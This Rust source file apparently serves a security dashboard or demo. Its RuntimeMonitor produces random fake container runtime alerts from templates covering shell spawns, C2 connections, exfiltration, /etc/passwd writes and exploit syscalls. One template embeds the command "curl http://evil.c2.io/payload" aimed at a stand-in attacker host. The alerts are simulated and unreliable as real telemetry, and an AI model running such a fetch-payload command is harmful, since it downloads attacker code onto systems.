use serde::{Deserialize, Serialize};
use rand::Rng;

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct RuntimeEvent {
    pub id: String,
    pub timestamp: String,
    pub event_type: String,   // PROCESS, NETWORK, FILE, SYSCALL
    pub severity: String,     // CRITICAL, HIGH, MEDIUM, LOW
    pub container: String,
    pub image: String,
    pub description: String,
    pub pid: u32,
}

pub struct RuntimeMonitor;

impl RuntimeMonitor {
    pub fn poll_events() -> Vec<RuntimeEvent> {
        let count = (rand::random::<u32>() as usize) % 4 + 2;
        let mut events = Vec::new();

        let containers = ["frontend-web-7f8a", "api-gateway-3b2c", "auth-svc-9d1e", "worker-queue-4a5f", "redis-cache-8c3d"];
        let images = [
            "node:18-alpine", "nginx:1.25", "python:3.12-slim",
            "golang:1.22", "redis:7-alpine", "postgres:16",
        ];

        let templates: Vec<(&str, &str, &str)> = vec![
            ("PROCESS", "HIGH", "Unexpected shell spawned: /bin/sh -c 'curl http://evil.c2.io/payload'"),
            ("PROCESS", "MEDIUM", "Process 'npm install' executed outside of build phase"),
            ("PROCESS", "CRITICAL", "Privilege escalation detected: setuid(0) called by non-root process"),
            ("NETWORK", "HIGH", "Outbound connection to known C2 IP 185.143.223.47:443"),
            ("NETWORK", "MEDIUM", "DNS query to suspicious domain: crypto-miner-pool.xyz"),
            ("NETWORK", "LOW", "Unexpected listener on port 9090 (not in SBOM service manifest)"),
            ("NETWORK", "CRITICAL", "Data exfiltration attempt: 14MB uploaded to external S3 bucket"),
            ("FILE", "HIGH", "Write to /etc/passwd detected from container process"),
            ("FILE", "MEDIUM", "Modified /usr/lib/node_modules/.package-lock.json at runtime"),
            ("FILE", "LOW", "Temp file created in /tmp with executable permissions"),
            ("SYSCALL", "CRITICAL", "ptrace(PTRACE_ATTACH) syscall intercepted — possible debugger injection"),
            ("SYSCALL", "HIGH", "mount() syscall from unprivileged container — breakout attempt"),
            ("SYSCALL", "MEDIUM", "Unusual ioctl() pattern matching CVE-2024-1086 exploit chain"),
            ("SYSCALL", "LOW", "High-frequency mmap() calls detected (>500/sec) — potential heap spray"),
        ];

        for _ in 0..count {
            let template = &templates[(rand::random::<u32>() as usize) % templates.len()];
            let container = containers[(rand::random::<u32>() as usize) % containers.len()];
            let image = images[(rand::random::<u32>() as usize) % images.len()];

            events.push(RuntimeEvent {
                id: format!("evt-{:08x}", rand::random::<u32>()),
                timestamp: chrono::Utc::now().format("%H:%M:%S%.3f").to_string(),
                event_type: template.0.to_string(),
                severity: template.1.to_string(),
                container: container.to_string(),
                image: image.to_string(),
                description: template.2.to_string(),
                pid: rand::random::<u32>() % 64000 + 1000,
            });
        }

        events
    }
}
